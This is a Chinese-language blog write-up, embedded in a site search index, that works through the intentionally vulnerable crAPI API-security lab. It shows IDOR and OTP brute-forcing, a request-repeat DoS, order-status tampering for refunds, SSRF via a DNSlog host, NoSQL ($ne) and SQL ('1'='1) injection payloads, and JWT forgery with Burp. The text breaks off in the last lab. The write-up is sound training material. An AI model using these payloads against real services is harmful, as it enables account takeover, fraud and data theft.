<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>crAPI靶场学习记录</title>
      <link href="/2023/07/10/crAPI%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/10/crAPI%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>API安全</p></blockquote><span id="more"></span><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><ul><li><a class="link" href="https://github.com/C2yb8er/crAPIlabs">靶场下载地址<i class="fas fa-external-link-alt"></i></a>(我fork了一份)</li><li>docker安装，笔者是用的wsl+docker.</li></ul><h1 id="lab0-初始账户"><a href="#lab0-初始账户" class="headerlink" title="lab0:初始账户"></a>lab0:初始账户</h1><ol><li>注册一个账户，邮箱为<a class="link" href="mailto:&#x41;&#x50;&#73;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#109;">&#x41;&#x50;&#73;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#109;<i class="fas fa-external-link-alt"></i></a>，密码为Admin@123</li></ol><p><img lazyload alt="image" data-src="1.png"></p><ol start="2"><li>登陆后访问对应IP的8025端口，接收邮件获取车辆信息。</li></ol><p><img lazyload alt="image" data-src="2.png"></p><p><img lazyload alt="image" data-src="3.png"></p><h1 id="lab1-访问其它用户车辆的详细信息"><a href="#lab1-访问其它用户车辆的详细信息" class="headerlink" title="lab1:访问其它用户车辆的详细信息"></a>lab1:访问其它用户车辆的详细信息</h1><ol><li><p>登录后首先找到泄露其它用户的车辆 id的接口。进入论坛主页点击某一个论坛文章发现此时的URL为：</p><p><img lazyload alt="image" data-src="4.png"></p><p>于是试着抓一下包，看能返回什么，可以看到已经返回了该用户的意思信息：</p><p><img lazyload alt="image" data-src="5.png"></p><p>进一步我们猜测一下直接抓论坛首页试试：</p><p><img lazyload alt="image" data-src="6.png"></p><p>在这里我们就得到了demo用户的<code>vehicleid</code>信息</p></li><li><p>要查车辆信息，现在我们只有Dashboard页面存在车辆信息，我们尝试抓包这个页面,抓了下首页发现是应该根据我们当前用户的Cookie来返回的，我们再找找有没有其他地方：</p></li></ol><p><img lazyload alt="image" data-src="7.png"></p><p><img lazyload alt="image" data-src="8.png"></p><p>​    我们将其替换为demo用户的<code>vehicleid</code>信息<code>54e7994a-e14e-4ee6-a46d-235ca3fd0eed</code></p><p><img lazyload alt="image" data-src="9.png"></p><h1 id="lab2-访问其它用户的机械报告"><a href="#lab2-访问其它用户的机械报告" class="headerlink" title="lab2:访问其它用户的机械报告"></a>lab2:访问其它用户的机械报告</h1><p><img lazyload alt="image" data-src="10.png"></p><p><img lazyload alt="image" data-src="11.png"></p><p>​    在提交的Json数据中发现危险数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;report_link&quot;</span>:<span class="string">&quot;http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=9&quot;</span></span><br></pre></td></tr></table></figure><p>​    这个数据返回了报告的地址，通过修改report_id，我们可以越权访问他人的数据：</p><p><img lazyload alt="image" data-src="13.png"></p><h1 id="lab3-重置其它用户的密码"><a href="#lab3-重置其它用户的密码" class="headerlink" title="lab3: 重置其它用户的密码"></a>lab3: 重置其它用户的密码</h1><p>退出登录，点击忘记密码，输入<code>API@qq.com</code>，点击<code>Sent OTP</code>，在后台查看验证码只有四位，于是准备爆破</p><p><img lazyload alt="image" data-src="14.png"></p><p>填写表单，密码修改为<code>Admin@456</code>，提交抓包查看：</p><p><img lazyload alt="image" data-src="15.png"></p><p>多交几次看看有没有限制爆破：</p><p><img lazyload alt="image" data-src="16.png"></p><p>由于是API的靶场，我们试试换个API的版本试试：</p><p><img lazyload alt="image" data-src="17.png"></p><p>开始着手爆破，选择狙击手模式即可，导入我们从0到9999的字典开始爆破：</p><p><img lazyload alt="image" data-src="18.png"></p><p>可以看到原来的密码已经不能登录了：</p><p><img lazyload alt="image" data-src="19.png"></p><h1 id="lab4-找到泄露其它用户敏感信息的API接口"><a href="#lab4-找到泄露其它用户敏感信息的API接口" class="headerlink" title="lab4: 找到泄露其它用户敏感信息的API接口"></a>lab4: 找到泄露其它用户敏感信息的API接口</h1><p>同lab1中的论坛页面信息泄露</p><h1 id="lab5-找到泄露视频内部属性的API接口"><a href="#lab5-找到泄露视频内部属性的API接口" class="headerlink" title="lab5: 找到泄露视频内部属性的API接口"></a>lab5: 找到泄露视频内部属性的API接口</h1><blockquote><p>感觉这个接口比较鸡肋</p></blockquote><p><img lazyload alt="image" data-src="20.png"></p><p>​    懒得按这个按钮才弹出的上传视频选项，于是我选择修改前端删掉hidden部分就可以：</p><p><img lazyload alt="image" data-src="21.png"></p><p><img lazyload alt="image" data-src="22.png"></p><p><img lazyload alt="image" data-src="23.png"></p><h1 id="lab6-使用-“contact-mechanic”-功能完成第7层DoS"><a href="#lab6-使用-“contact-mechanic”-功能完成第7层DoS" class="headerlink" title="lab6: 使用 “contact mechanic” 功能完成第7层DoS"></a>lab6: 使用 “contact mechanic” 功能完成第7层DoS</h1><p><img lazyload alt="image" data-src="10.png"></p><p><img lazyload alt="image" data-src="11.png"></p><p>​    在提交的Json数据中发现危险数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;repeat_request_if_failed&quot;</span>:<span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;number_of_repeats&quot;</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure><p>​    我们尝试修改，再重新提交：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;repeat_request_if_failed&quot;</span>:<span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;number_of_repeats&quot;</span>:<span class="number">1000000000</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="12.png"></p><h1 id="lab7-删除另一个用户的视频"><a href="#lab7-删除另一个用户的视频" class="headerlink" title="lab7:删除另一个用户的视频"></a>lab7:删除另一个用户的视频</h1><blockquote><p>这个API危害挺大</p></blockquote><p>还是lab5处的抓包，我们修改一下协议，把PUT修改为OPTIONS</p><blockquote><p>HTTP中的OPTIONS方法是一种用于获取目标资源所支持的HTTP方法列表的请求方法。它允许客户端向服务器查询对特定资源所支持的请求方法，以确定在不实际发送请求的情况下，可以对该资源执行哪些操作。</p><p>OPTIONS请求的主要用途包括：</p><ol><li>CORS（跨域资源共享）：在进行跨域请求时，浏览器会首先发送一个OPTIONS请求，以确定服务器是否允许发送实际的跨域请求。<strong>服务器可以通过返回特定的响应头（如Access-Control-Allow-Methods）来指示允许的请求方法。</strong></li><li>服务器功能查询：客户端可以使用OPTIONS请求向服务器查询特定资源支持的HTTP方法列表。这对于动态确定可以执行的操作非常有用，可以根据服务器返回的允许的方法列表来自适应地构建请求。</li><li>API文档和发现：OPTIONS方法还可以用于提供API文档和服务发现功能。通过在OPTIONS响应中包含有关资源的元数据，例如支持的方法、请求头等信息，客户端可以获得有关API的更多信息，以便正确使用和调用API。</li></ol></blockquote><blockquote><ol><li>GET：用于从服务器获取资源。客户端发送一个GET请求来获取指定URI的资源。GET请求是幂等的，即多次发送相同的GET请求应该返回相同的响应。</li><li>POST：用于向服务器提交数据，创建新资源或触发服务器的处理操作。POST请求将数据作为请求体发送给服务器，通常用于提交表单数据、上传文件等。</li><li>PUT：用于向服务器更新或替换资源。PUT请求将请求体中的数据保存到服务器上指定的URI位置。如果URI不存在，则可以创建新资源；如果URI已存在，则将其替换为请求的内容。</li><li>DELETE：用于删除服务器上的资源。DELETE请求用于删除指定URI的资源。</li><li>OPTIONS：用于获取目标资源所支持的HTTP方法列表。OPTIONS请求允许客户端查询服务器对特定资源支持的请求方法，以确定可以对该资源执行哪些操作。</li><li>HEAD：与GET方法类似，但不返回响应体，仅返回响应头。HEAD请求用于获取关于资源的元数据，例如响应头中的信息，而无需传输整个响应体。</li><li>PATCH：用于对服务器上的资源进行局部更新。PATCH请求仅对资源进行部分修改，而不是替换整个资源。</li></ol><p>除了上述方法外，HTTP/1.1 规范还定义了其他一些请求方法，如：</p><ul><li>TRACE：用于在请求往返的路径上执行一个追踪。它通常用于诊断和调试，以确定请求如何通过代理服务器和中间节点传输。</li><li>CONNECT：用于建立与目标主机的隧道连接，通常用于通过代理服务器建立安全的HTTPS连接。</li></ul></blockquote><p><img lazyload alt="image" data-src="24.png"></p><p>权限不足说明需要用admin的身份：</p><p><img lazyload alt="image" data-src="25.png"></p><p><img lazyload alt="image" data-src="26.png"></p><p>​    后续通过修改<code>videos/</code>后的ID可以实现任意视频的删除</p><h1 id="lab8-免费获得一件物品"><a href="#lab8-免费获得一件物品" class="headerlink" title="lab8: 免费获得一件物品"></a>lab8: 免费获得一件物品</h1><p><img lazyload alt="image" data-src="27.png"></p><p>点击后抓包：</p><p><img lazyload alt="image" data-src="28.png"></p><p><mark>修改请求方式为GET</mark>：</p><p><img lazyload alt="image" data-src="29.png"></p><p>我们可以敏锐地观察到返回的Json数据中有一个status数据，明显表示着已经订购的信息。回到购买界面，我们看到还有Return按钮，我们点击后抓包看看：</p><p><img lazyload alt="image" data-src="30.png"></p><p><img lazyload alt="image" data-src="31.png"></p><p>直接切换成GET请求爆出了无权使用的消息，不慌张我们试试尝试着先把这个货品退回再用之前的方式利用order_id进行查看，发现状态确实发生了改变。</p><p><img lazyload alt="image" data-src="32.png"></p><p>​    这里我们大胆猜想退回的状态就是returned进行修改试试，注意由于status是原来就有的数据，所以这里我们需要用PUT协议进行提交而不是POST协议：</p><blockquote><p>PUT和POST是HTTP请求方法，用于向服务器提交数据。它们在语义和使用场景上有以下区别：</p><ol><li>目的：POST用于向服务器提交数据，请求服务器对数据进行处理。通常用于创建新资源、提交表单数据、发送评论等。PUT用于向服务器更新或替换指定URI的资源。如果URI不存在，则可以创建新资源；如果URI已存在，则将其替换为请求的内容。</li><li>幂等性：POST请求不是幂等的，即多次发送相同的POST请求可能会产生不同的结果。每次发送POST请求，服务器可能会创建新的资源、执行不同的操作或返回不同的响应。PUT请求是幂等的，即多次发送相同的PUT请求应该产生相同的结果。每次发送PUT请求，服务器应该将请求的内容保存在指定的URI位置，因此多次请求会更新或替换相同的资源。</li><li>数据位置：POST请求将数据包含在请求体中发送给服务器。数据的格式可以是表单数据、JSON、XML等。PUT请求也将数据包含在请求体中，但是它通常用于指定URI位置的资源，并将请求的内容保存在该位置。</li><li>资源标识：POST请求通常由服务器决定资源的标识，并返回新资源的标识符（如生成的ID）。PUT请求通常由客户端指定资源的标识，即URI中的位置。</li></ol><p>总结来说，<mark>POST用于提交数据进行处理，通常用于创建新资源或执行操作，而PUT用于更新或替换指定URI的资源。</mark>POST请求不是幂等的，而PUT请求是幂等的。根据具体的应用场景和资源操作需求，选择适当的请求方法来进行数据提交和资源更新。</p></blockquote><p>从返回的数据可以看到已经修改成功了，也就是说我们空少套白狼了4个椅子</p><p><img lazyload alt="image" data-src="33.png"></p><p><img lazyload alt="image" data-src="34.png"></p><h1 id="lab9-将您的结余增加1000元或以上"><a href="#lab9-将您的结余增加1000元或以上" class="headerlink" title="lab9:将您的结余增加1000元或以上"></a>lab9:将您的结余增加1000元或以上</h1><p>同样地利用上面的API，因为我们发现数据不仅可以提交status还可以提交quantity。</p><p>先将quantity改为100，status改为delivered，这样我们就可以不花钱就点了100个价值10元的椅子</p><p><img lazyload alt="image" data-src="35.png"></p><p>然后修改状态为returned，就可以退钱！！！🤑</p><p><img lazyload alt="image" data-src="36.png"></p><h1 id="lab10-更新内部视频属性"><a href="#lab10-更新内部视频属性" class="headerlink" title="lab10: 更新内部视频属性"></a>lab10: 更新内部视频属性</h1><p>同lab5的抓包，我们可以看到返回的Json数据有如下几种：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;id&quot;</span>:<span class="number">32</span>,</span><br><span class="line"><span class="string">&quot;video_name&quot;</span>:<span class="string">&quot;catflag.php&quot;</span>,</span><br><span class="line"><span class="string">&quot;conversion_params&quot;</span>:<span class="string">&quot;-v codec h264&quot;</span>,</span><br><span class="line"><span class="string">&quot;profileVideo&quot;</span>:<span class="string">&quot;太多了这里就省略了&quot;</span></span><br></pre></td></tr></table></figure><p>所以我们需要更改的话就使用PUT协议，在请求的Json数据中指定就好。</p><p><img lazyload alt="image" data-src="37.png"></p><h1 id="lab11-让crAPI发送一个HTTP调用到“www-baidu-com”-并返回-HTTP响应"><a href="#lab11-让crAPI发送一个HTTP调用到“www-baidu-com”-并返回-HTTP响应" class="headerlink" title="lab11: 让crAPI发送一个HTTP调用到“www.baidu.com” 并返回 HTTP响应"></a>lab11: 让crAPI发送一个HTTP调用到“<a class="link" href="http://www.baidu.com”/">www.baidu.com”<i class="fas fa-external-link-alt"></i></a> 并返回 HTTP响应</h1><p>同lab2接口与抓包，抓包后我们在请求信息中发现了关键信息：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;mechanic_api&quot;</span>:<span class="string">&quot;http://localhost:8888/workshop/api/mechanic/receive_report&quot;</span>,</span><br></pre></td></tr></table></figure><p>我们猜想，把这个地址改为<code>www.baidu.com</code>就能实现lab。</p><p>为了验证这个猜想，我们使用DNSlog进行验证，使用工具：<a class="link" href="https://dig.pm/">https://dig.pm/<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>DNSlog是一种用于收集和分析DNS查询的日志的技术和工具。在网络通信中，DNS（Domain Name System）用于将域名解析为对应的IP地址。DNSlog通过设置恶意DNS服务器或域名来截获应用程序或系统发出的DNS查询请求，并将查询信息记录到日志中。</p><p>DNSlog注入是一种利用应用程序对DNS查询结果的处理不当而导致的安全漏洞。它通常发生在应用程序通过DNS查询获取动态资源时，没有对返回的DNS响应进行充分的验证和过滤。攻击者可以通过构造恶意的DNS查询请求，将恶意内容注入到应用程序的响应中，从而实现攻击目的。</p></blockquote><p><img lazyload alt="image" data-src="38.png"></p><p>​    复制subdomain并加上http://后替换mechanic_api的值</p><p><img lazyload alt="image" data-src="39.png"></p><h1 id="lab12-想办法在不知道优惠券代码的情况下获得免费优惠券"><a href="#lab12-想办法在不知道优惠券代码的情况下获得免费优惠券" class="headerlink" title="lab12: 想办法在不知道优惠券代码的情况下获得免费优惠券"></a>lab12: 想办法在不知道优惠券代码的情况下获得免费优惠券</h1><p>先找到输出优惠卷代码的接口，进行抓包查看数据：</p><p><img lazyload alt="image" data-src="40.png"></p><p>查了一下文档，考点是<code>NoSQL Injection</code>，之前都学的是SQL注入基于MySQL的这里来个NoSQL给我整不会了，先学一下NoSQL的基本知识：</p><blockquote><p>NoSQL注入（NoSQL Injection）是一种攻击技术，针对使用NoSQL数据库的应用程序而言，类似于传统SQL注入攻击。NoSQL注入利用了应用程序对用户输入数据的处理不当，以执行未授权的操作或绕过访问控制。</p><p>NoSQL数据库与传统关系型数据库不同，其查询语言和数据存储机制也不同。然而，一些NoSQL数据库仍然需要处理用户提供的数据，如查询参数、过滤条件等。如果应用程序没有正确验证和过滤这些用户输入数据，就可能存在NoSQL注入漏洞。</p><p>NoSQL注入攻击的原理是攻击者通过在应用程序发送给NoSQL数据库的查询中注入恶意的数据，以干扰查询的逻辑。攻击者可以利用以下方法进行注入攻击：</p><ol><li>注入查询语句：攻击者通过在查询中注入恶意操作符、查询语句或特殊字符，来修改查询的逻辑，获取敏感数据或执行未授权的操作。</li><li>绕过访问控制：攻击者可以通过注入特定的查询条件来绕过应用程序的访问控制机制，获取未授权的数据或执行特权操作。</li><li>盲注入：在一些情况下，应用程序可能没有直接将查询结果返回给用户，而是根据查询的结果来进行后续操作。攻击者可以通过注入特定的查询条件，观察应用程序的行为差异，从而推断出查询的结果或执行特定操作。</li></ol><p>NoSQL（Not Only SQL）是一类非关系型数据库，与传统的关系型数据库（如MySQL、Oracle）相对应。NoSQL数据库设计的初衷是解决关系型数据库在大规模数据存储和高并发访问方面的局限性。</p><p>NoSQL数据库采用了不同的数据模型和存储机制，以满足特定的应用需求。与传统关系型数据库使用表格结构和SQL查询语言不同，NoSQL数据库通常采用以下数据模型之一：</p><ol><li>键值存储（Key-Value Stores）：使用简单的键值对结构存储数据，通过唯一的键来访问数据。例如，Redis、DynamoDB。</li><li>文档存储（Document Stores）：以类似JSON或XML的文档格式存储数据，每个文档都有唯一的标识符。例如，MongoDB、CouchDB。</li><li>列族存储（Column Family Stores）：将数据组织为列族的形式，每个列族包含不同的列和行。例如，HBase、Cassandra。</li><li>图形数据库（Graph Databases）：用于处理图形结构数据，其中节点和边表示实体和它们之间的关系。例如，Neo4j、JanusGraph。</li></ol><p>NoSQL数据库具有以下特点和优势：</p><ul><li>可扩展性：NoSQL数据库通常具有良好的横向扩展性，可以轻松处理大规模数据和高并发访问。</li><li>灵活的数据模型：NoSQL数据库提供了灵活的数据模型，适应不同类型和结构的数据，无需事先定义严格的表格结构。</li><li>高性能：由于去除了复杂的关系模型和复杂的查询语言，NoSQL数据库可以实现更高的读写性能。</li><li>弱一致性：一些NoSQL数据库采用了弱一致性模型，允许数据在不同节点之间存在一定的延迟和不一致性，以提高性能和可用性。</li><li>分布式架构：NoSQL数据库常用于分布式环境中，数据可以在多个节点上进行分布和复制，提供高可用性和容错性。</li></ul></blockquote><p>我们在这里使用了两个数据库软件分别是<code>Postgresdb</code>和<code>Mongodb</code>，通过我们之前的响应信息的Json格式可以判断。但是这里的<code>Postgresdb</code>常简称为Postgres）是一个开源的关系型数据库管理系统（RDBMS），而不是NoSQL数据库。</p><p>经过查阅docker的日志，很神奇我并没有使用这个db，可能是我们的模块暂未使用它吧。</p><p><img lazyload alt="image" data-src="41.png"></p><p>故我们只需要面对Mongodb进行NoSQL注入就行了</p><p>原本的Json提交数据是：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;coupon_code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这表示MongoDB将搜索集合中满足查询条件的文档，并返回结果集中包含”coupon_code”字段值为”1234”的文档。</p><p><img lazyload alt="image" data-src="42.png"></p><p>在学习了最基本的NoSQL注入的语句和Mongodb数据的结构后我构造了payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;coupon_code&quot;</span>: &#123;<span class="string">&quot;$ne&quot;</span>: <span class="string">&quot;hacked by c2yb8er&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>这个查询条件的意思是，查找”coupon_code”字段值不等于<code>hacked by c2yb8er</code>的文档。</p><p>其中<code>$ne</code>操作符表示不等于的意思</p><p><a class="link" href="https://xz.aliyun.com/t/9908#toc-4">NoSQL学习link<i class="fas fa-external-link-alt"></i></a></p><h1 id="lab13-找到一种通过修改数据库来兑换已经领取的优惠券的方法"><a href="#lab13-找到一种通过修改数据库来兑换已经领取的优惠券的方法" class="headerlink" title="lab13: 找到一种通过修改数据库来兑换已经领取的优惠券的方法"></a>lab13: 找到一种通过修改数据库来兑换已经领取的优惠券的方法</h1><blockquote><p>有点疑惑，实战的时候找不到这种文档怎么办？</p></blockquote><p>查看文档发现一个接口<code>/workshop/api/shop/apply_coupon</code></p><p><img lazyload alt="image" data-src="43.png"></p><p>我很懵逼，为什么我明明用的Mongodb，不应该是NoSQL注入吗？这里为什么来了一个MySQL中的字符型注入？查阅一下相应代码，真相水落石出了！</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ApplyCouponView</span>(<span class="title class_ inherited__">APIView</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Apply Coupon View to increase the available credit</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">    @jwt_auth_required</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, request, user=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        api for checking if coupon is already claimed</span></span><br><span class="line"><span class="string">        if claimed before: returns an error message</span></span><br><span class="line"><span class="string">        else: increases the user credit</span></span><br><span class="line"><span class="string">        :param request: http request for the view</span></span><br><span class="line"><span class="string">            method allowed: POST</span></span><br><span class="line"><span class="string">            http request should be authorised by the jwt token of the user</span></span><br><span class="line"><span class="string">        :param user: User object of the requesting user</span></span><br><span class="line"><span class="string">        :returns Response object with</span></span><br><span class="line"><span class="string">            message and 200 status if no error</span></span><br><span class="line"><span class="string">            message and corresponding status if error</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        coupon_request_body = request.data</span><br><span class="line"></span><br><span class="line">        serializer = CouponSerializer(data=coupon_request_body)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> serializer.is_valid():</span><br><span class="line">            log_error(request.path, request.data, <span class="number">400</span>, serializer.errors)</span><br><span class="line">            <span class="keyword">return</span> Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">            cursor.execute(<span class="string">&quot;SELECT coupon_code from applied_coupon WHERE user_id = &quot;</span>\</span><br><span class="line">                    + <span class="built_in">str</span>(user.<span class="built_in">id</span>)\</span><br><span class="line">                    + <span class="string">&quot; AND coupon_code = &#x27;&quot;</span>\</span><br><span class="line">                    + coupon_request_body[<span class="string">&#x27;coupon_code&#x27;</span>]\</span><br><span class="line">                    + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">            row = cursor.fetchall()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> row <span class="keyword">and</span> row != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span>: row[<span class="number">0</span>][<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + messages.COUPON_ALREADY_APPLIED,</span><br><span class="line">                &#125;,</span><br><span class="line">                status=status.HTTP_400_BAD_REQUEST</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            coupon = Coupon.objects.using(<span class="string">&#x27;mongodb&#x27;</span>).get(coupon_code=coupon_request_body[<span class="string">&#x27;coupon_code&#x27;</span>])</span><br><span class="line">        <span class="keyword">except</span> ObjectDoesNotExist <span class="keyword">as</span> e:</span><br><span class="line">            log_error(request.path, request.data, <span class="number">400</span>, e)</span><br><span class="line">            <span class="keyword">return</span> Response(</span><br><span class="line">                &#123;<span class="string">&#x27;message&#x27;</span>: messages.COUPON_NOT_FOUND&#125;,</span><br><span class="line">                status=status.HTTP_400_BAD_REQUEST</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        AppliedCoupon.objects.create(</span><br><span class="line">            user=user,</span><br><span class="line">            coupon_code=coupon_request_body[<span class="string">&#x27;coupon_code&#x27;</span>]</span><br><span class="line">        )</span><br><span class="line">        user_details = UserDetails.objects.get(user=user)</span><br><span class="line">        user_details.available_credit += coupon_request_body[<span class="string">&#x27;amount&#x27;</span>]</span><br><span class="line">        user_details.save()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">&#x27;credit&#x27;</span>: user_details.available_credit,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: messages.COUPON_APPLIED</span><br><span class="line">        &#125;, status=status.HTTP_200_OK)</span><br></pre></td></tr></table></figure><p>注入点是这段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">    cursor.execute(<span class="string">&quot;SELECT coupon_code from applied_coupon WHERE user_id = &quot;</span>\</span><br><span class="line">            + <span class="built_in">str</span>(user.<span class="built_in">id</span>)\</span><br><span class="line">            + <span class="string">&quot; AND coupon_code = &#x27;&quot;</span>\</span><br><span class="line">            + coupon_request_body[<span class="string">&#x27;coupon_code&#x27;</span>]\</span><br><span class="line">            + <span class="string">&quot;&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>当我传入如下数据后：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;coupon_code&quot;</span>:<span class="string">&quot;1&#x27;or &#x27;1&#x27;=&#x27;1&quot;</span>,</span><br><span class="line"><span class="string">&quot;amount&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里执行的SQL语句就会变成这样：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> coupon_code <span class="keyword">from</span> applied_coupon <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;My_id&#x27;</span> <span class="keyword">AND</span> coupon_code <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span><span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>破案了！我还以为我刚刚学的NoSQL注入白学了！🥺</p><h1 id="lab14-查找不为用户执行身份验证检查的接口"><a href="#lab14-查找不为用户执行身份验证检查的接口" class="headerlink" title="lab14: 查找不为用户执行身份验证检查的接口"></a>lab14: 查找不为用户执行身份验证检查的接口</h1><p>同lab3中的<code>/workshop/api/mechanic/mechanic_report?report_id=6 </code></p><p>同lab8中的<code>/workshop/api/shop/orders/1</code></p><h1 id="lab15-找到伪造有效-JWT-令牌的方法"><a href="#lab15-找到伪造有效-JWT-令牌的方法" class="headerlink" title="lab15:找到伪造有效 JWT 令牌的方法"></a>lab15:找到伪造有效 JWT 令牌的方法</h1><blockquote><p>我感觉 JWT 的水还有点深，今天刷太多lab了后面有时间好好地学习下。 </p></blockquote><p><a class="link" href="https://auth0.com/docs/secure/tokens/json-web-tokens/json-web-key-sets">查阅文档<i class="fas fa-external-link-alt"></i></a>：Auth0 exposes a JWKS endpoint for each tenant, which is found at <code>https://&#123;yourDomain&#125;/.well-known/jwks.json</code>. This endpoint will contain the JWK used to verify all Auth0-issued JWTs for this tenant.</p><p>通过访问<code>http://localhost:8888/.well-known/jwks.json</code>获取JWT的公钥</p><p><img lazyload alt="image" data-src="44.png"></p><p> 到 JWT选项卡，点击New RSA Key 复制 JWK key 内容</p><p><img lazyload alt="image" data-src="45.png"></p><p><img lazyload alt="image" data-src="46.png"></p><p> 之后再右键我们新建的<code>Key Copy Public Key as Pem</code></p><p><img lazyload alt="image" data-src="47.png"></p><p> 去Decoder选项卡对这个 PEM 密钥进行 Base64 编码，然后复制生成的字符串</p><p><img lazyload alt="image" data-src="48.png"></p><p>​    再次回到Burp 主选项卡栏中 的 JWT Editor Keys选项卡，点击New Symmetric Key后Generate,将 k 属 性的生成值替换为PEM Base64编码</p><p><img lazyload alt="image" data-src="49.png"></p><p>​    然后在burp的请求中可以发现 json web token选项卡,在选择卡左下角处也可以看到对 json web token 的攻击选项。</p><p><img lazyload alt="image" data-src="50.png"></p><h1 id="AddLab1-增加一个商品"><a href="#AddLab1-增加一个商品" class="headerlink" title="AddLab1: 增加一个商品"></a>AddLab1: 增加一个商品</h1><p>对首页的<code>Shop</code>进行抓包：</p><p><img lazyload alt="image" data-src="51.png"></p><p>查看相应信息发现同时也支持POST协议，把GET改为POST试试：<br><img lazyload alt="image" 